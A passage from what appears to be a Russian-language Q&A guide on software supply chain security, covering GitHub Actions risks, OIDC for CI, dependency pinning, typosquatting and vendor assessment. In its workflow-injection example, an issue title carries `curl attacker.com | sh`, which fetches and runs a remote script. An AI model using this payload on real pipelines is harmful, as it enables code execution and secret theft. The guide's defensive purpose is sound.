- Tekton Chains — автоматически добавляет provenance ко всем сборкам.

**Проверка:**
```bash
slsa-verifier verify-artifact myapp.tar.gz \
  --source-uri github.com/myorg/myrepo \
  --source-tag v1.0 \
  --provenance-path myapp.intoto.jsonl
```

**Принуждение политикой:** admission controller на входе в кластер проверяет, что provenance ссылается на ожидаемый репозиторий и ветку — иначе деплой блокируется.

## Q19. (!) Какие supply chain риски есть у GitHub Actions?

GitHub Actions — это исполнение чужого кода с вашими секретами, поэтому почти каждый риск сводится к одному: атакующий протаскивает свой код или claim туда, где ему доверяют. Ниже основные векторы и их закрытие.

**1. Скомпрометированные сторонние actions:**
- Привязка к ветке (`@main`) означает «выполнить любой коммит, который туда попадёт». Атакующий компрометирует action — и все потребители молча запускают его код.
- **Фикс:** привязывать к **commit SHA** (`uses: org/action@abc123...`), а обновлять этот SHA через Dependabot с ревью.

**2. Pwn-запросы (опасный триггер форков):**
- Событие `pull_request_target` запускает workflow с правами на запись для PR из форка.
- В итоге код из форка атакующего выполняется с доступом к секретам репозитория.
- Фикс: избегать `pull_request_target`, использовать `pull_request` (он идёт без секретов).

**3. Утечка секретов:**
- Action случайно печатает секрет в лог: `echo "token: $TOKEN"` — и он засветился в публичных логах.
- GitHub маскирует известные секреты, но ловит не все, поэтому полагаться на маскирование нельзя.

**4. Повышение привилегий через раннер:**
- Self-hosted-раннеры переиспользуются, и состояние прошлого джоба остаётся на машине.
- PR атакующего отрабатывает на раннере и оставляет закладку, компрометирующую будущие джобы.
- Фикс: эфемерные раннеры; не использовать self-hosted для публичных репозиториев.

**5. Инъекция в workflow:**
- Подстановка недоверенного ввода вроде `${{ github.event.issue.title }}` прямо в shell:
  ```yaml
  run: echo "${{ github.event.issue.title }}"
  ```
- Заголовок issue вида `"); curl attacker.com | sh # ` вырывается из строки и выполняется как команда.
- Фикс: не подставлять ввод в shell напрямую, а прокидывать через `env`:
  ```yaml
  env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
  ```

**6. Избыточные права токена:**
- У `GITHUB_TOKEN` права по умолчанию широкие — при компрометации джоба это лишний рычаг.
- Минимизировать по принципу least privilege: `permissions: contents: read` в джобе.

**Эшелонированная защита (defense-in-depth)** — ни одна мера не закрывает всё, поэтому их складывают:
- `allowed_actions` в настройках организации — allowlist разрешённых actions.
- Обязательные ревьюеры на секреты окружения.
- Усиленные раннеры с привязкой версий (`actions/checkout@...`).
- OIDC к облаку вместо хранимых учёток (см. Q20).
- Сканирование workflow правилами Semgrep.

## Q20. OIDC для CI (без long-lived credentials)?

**Проблема:** CI нужны учётки облака (AWS/GCP/Azure). Если хранить их как секреты, они живут вечно, и их утечка = постоянный доступ для атакующего.

**Решение — OIDC workload federation:** CI-провайдер (GitHub, GitLab, CircleCI) на лету выпускает подписанный JWT, облачный провайдер настроен ему доверять и в обмен выдаёт **короткоживущие** учётки. Постоянный секрет хранить больше не нужно.

**GitHub Actions → AWS:**
```yaml
permissions:
  id-token: write  # allows OIDC token issuance
  contents: read

steps:
  - uses: aws-actions/configure-aws-credentials@v4
    with:
      role-to-assume: arn:aws:iam::123:role/deploy
      aws-region: us-east-1
```

**Сторона AWS (trust policy):**
```json
{
  "Effect": "Allow",
  "Principal": {
    "Federated": "arn:aws:iam::123:oidc-provider/token.actions.githubusercontent.com"
  },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:ref:refs/heads/main"
    }
  }
}
```

**Поток по шагам:**
1. Workflow стартует — GitHub чеканит JWT с claims о репозитории и ветке.
2. Action отправляет JWT в AWS STS `AssumeRoleWithWebIdentity`.
3. AWS проверяет подпись JWT по публичным ключам GitHub и условие из trust policy (совпадение репозитория/ветки).
4. В ответ приходят временные учётки (на ~1 час).

**Что это даёт:**
- **Нет долгоживущих ключей** в секретах — красть нечего.
- **Гранулярное доверие** — роль выдаётся только конкретному репозиторию и ветке (а не «любому, у кого есть ключ»).
- **Аудируемость** через CloudTrail.
- Ротация не нужна: учётки и так короткоживущие.

**Где поддерживается:** AWS, GCP, Azure, HashiCorp Cloud, Vault и многие другие.

**Рекомендация:** перевести весь CI на облачную аутентификацию через OIDC и удалить долгоживущие access-ключи IAM-пользователей — иначе старый секрет остаётся обходным путём.

## Q21. Закрепление зависимостей: hash vs version?

Закрепить зависимость можно двумя способами, и они защищают от разного: **version pin фиксирует номер версии, hash pin — конкретные байты**. Только второй спасает от подмены содержимого под тем же номером.

**Закрепление по версии (version pin):**
```json
"lodash": "4.17.21"
```
- Фиксирует номер: всегда ставится именно `4.17.21`.
- **Слабое место:** номер не гарантирует содержимое. npm в редких случаях допускает перезапись, а скомпрометированный мейнтейнер может выложить новый tarball под тем же номером — version pin этого не заметит.

**Закрепление по хешу (hash pin):**
```json
"lodash": "npm:lodash@4.17.21"
"integrity": "sha512-abc123..."
```
- Хеши лежат в `package-lock.json` / `yarn.lock`.
- При установке хеш сверяется; несовпадение = ошибка, установка падает.

**Почему именно hash pin важен:**
- **Обнаружение подмены:** если атакующий переопубликует пакет с вредоносным кодом, хеш не совпадёт и установка остановится.
- **Воспроизводимость:** всегда ставятся ровно те же байты, что и в прошлый раз.

**В разных экосистемах:**

**npm:**
- `package-lock.json` автоматически (npm 5+)
- `npm ci` принудительно использует lockfile

**Python (pip):**
```
requirements.txt
  lodash==4.17.21 \
    --hash=sha256:abc123...
```
- `pip-compile --generate-hashes`
- `pip install --require-hashes -r requirements.txt`

**Go:**
- `go.sum` — автоматические хеши всех deps
- `GOFLAGS=-mod=readonly` падает, если что-то изменилось

**Docker:**
```dockerfile
FROM ubuntu@sha256:abc123...  # pin by digest, not tag
```

**Java (Maven):**
- Нативного hash pin нет; добавляют **Maven Enforcer Plugin** с проверкой хешей.
- Либо переходят на **Gradle** с его dependency locking.

**Чем рискуете без hash pin** — все три риска про одно: можно получить правильный номер версии при неправильном содержимом:
- Атаки подмены зависимостей.
- Скомпрометированные зеркала и кеши.
- «Правильная версия, неправильные байты».

## Q22. (!) Как защититься от typosquatting?

**Typosquatting** — атакующий публикует пакет с именем, почти неотличимым от популярного (`electorn` вместо `electron`, `reqeusts` вместо `requests`), в расчёте на опечатку при установке. Защита строится в два эшелона: сначала **не дать поставить чужой пакет** (контроль источника), затем **поймать подозрительное**, если оно всё же просочилось.

**Контроль того, что вообще можно ставить:**

**1. Внутренний реестр пакетов:** приватное зеркало npm/PyPI, где разрешены только проверенные пакеты. `npm install X` у разработчика идёт сначала в него, а не в публичный реестр.

**2. Allowlists:** CI блокирует установку неодобренных пакетов, а изменения `package.json` проходят ревью в PR.

**3. Scoped-пакеты:** `@myorg/mylib` с зарезервированным scope убирает путаницу с публичными именами.

**8. Предотвращение dependency confusion:** заранее регистрировать имена приватных пакетов в **публичном** реестре, чтобы их не занял атакующий, и настроить пакетный менеджер на приоритет внутреннего реестра.

**Обнаружение подозрительного и подмены:**

**4. Сканирование новых deps:** при добавлении зависимости — SCA-ревью перед merge. Socket.dev / Deps.dev подсвечивают подозрительные пакеты (например, с postinstall-скриптами).

**5. Отложенный апгрейд:** не обновляться автоматически на совсем свежие пакеты (моложе ~7 дней) — это даёт сообществу время заметить вредонос до того, как он попадёт к вам.

**6. Ручное ревью критичных deps:** для топ-N зависимостей (логирование, крипто, веб-фреймворк) читать сами исходники, а не доверять имени.

**7. Мониторинг typosquat-ов:** сервисы вроде `package-name-checker`; проактивно регистрировать частые опечатки имён собственных пакетов, чтобы атакующий не сделал это первым.

**9. Закреплённые зависимости (Q21):** массовая подмена версий ловится по несовпадению хеша.

**Реальные примеры:**
- Пакет `colors` (2022) — самосаботаж мейнтейнера; пойман уже после нанесённого ущерба, что и показывает ценность отложенного апгрейда.
- Массовый typosquat в PyPI (сотни пакетов) — автоматически обнаружен самим PyPI.

## Q23. (!) Как проводить оценку рисков вендора (vendor risk assessment)?

Это структурированная оценка рисков перед тем, как впустить сторонний софт или SaaS в свою цепочку поставок — потому что его уязвимости становятся вашими. Оценку ведут по нескольким осям, а глубину проверки соразмеряют критичности вендора.

**Что спрашивать у вендора:**

**Состояние безопасности:**
- Есть сертификация SOC 2 Type II / ISO 27001?
- Доступны отчёты по пентестам?
- Есть план реагирования на инциденты?
- История утечек данных?

**Обработка данных:**
- Где хранятся данные (регион, юрисдикция)?
- Шифрование at rest / in transit?
- Политики хранения / удаления данных?
- Соответствие GDPR, CCPA?

**Доступ и аутентификация:**
- Поддержка SSO / SAML / OIDC?
- Принудительный MFA?
- RBAC / least-privilege?
- Журналы аудита?

**Цепочка поставок:**
- Раскрыты ли субподрядчики (sub-processors)?
- Практики безопасности по зависимостям?
- Доступен ли SBOM?

**Операционка:**
- SLA / uptime?
- Status-страница / коммуникация по инцидентам?
- Бэкап и восстановление?

**Инструменты:**
- **Whistic**, **OneTrust** — платформы управления вендорами
- **Опросники по безопасности** (SIG Lite, CAIQ)
- **OpenFINT, Trust-центры** — опубликованные вендором свидетельства

**Оценка не разовая, а постоянная:**
- Ежегодная переоценка.
- Мониторинг утечек (новости, HIBP).
- Обязательная контрольная точка при продлении контракта.

**Глубину проверки соразмеряют критичности (tiering):**
- **Tier 1** (провайдер аутентификации, облако) — высокий контроль: их компрометация роняет всё.
- **Tier 2** (CMS, аналитика) — средний.
- **Tier 3** (вспомогательные инструменты) — базовый.

**Закладывайте время:** ревью безопасности для Tier 1 занимает **недели**, поэтому начинать нужно сильно заранее, а не перед самым подписанием.

## Q24. Как выглядит roadmap внедрения supply chain security?

Внедрять защиту нужно в порядке отдачи: сначала **видимость** (нельзя защищать то, чего не видишь), потом усиление сборки, затем attestations, и только в конце — принуждение политикой, когда уже есть что принуждать.

**Прагматичный порядок внедрения:**

**Фаза 1 — Видимость (недели):**
1. Включить Dependabot на всех репозиториях
2. Генерировать SBOM в CI (Syft) — загружать как артефакт
3. Сканировать контейнеры через Trivy в CI
4. GitHub code scanning (Semgrep, CodeQL)

**Фаза 2 — Усиление сборки (1–2 месяца):**
5. Привязать actions к commit SHA
6. Минимальные права `GITHUB_TOKEN`
7. OIDC к облаку (заменить долгоживущие учётки)
8. Защита веток + обязательные ревью
9. Подписанные коммиты (gitsign)

**Фаза 3 — Attestations (месяцы):**
10. Подписывать артефакты через Cosign (keyless)
11. SLSA L3 provenance (slsa-github-generator)
12. SBOM-attestation на артефактах
13. Attestation сканирования уязвимостей

**Фаза 4 — Принуждение (кварталы):**
14. Admission controller (Kyverno) проверяет подписи
15. Политика: деплоятся только подписанные образы
16. Обязательные attestations SBOM + provenance
17. Формализованный процесс vendor risk

**Фаза 5 — Продвинутое (постоянно):**
18. Пилот воспроизводимых сборок
19. Герметичные сборки (Bazel) для критичных сервисов
20. VEX-утверждения для известных ложных срабатываний
21. Red team: симуляция supply chain attack

**Чем измерять прогресс:**
- % репозиториев с включённым Dependabot.
- % подписанных артефактов.
- Среднее время от появления CVE до выкатки патча.
- Количество заблокированных неодобренных пакетов.

**Главная ловушка — разрастание инструментов (tool sprawl):** соблазн поставить всё сразу заканчивается зоопарком из несвязанных тулов, которые никто не сопровождает. Начните с 2–3 хорошо интегрированных и расширяйтесь по мере зрелости.
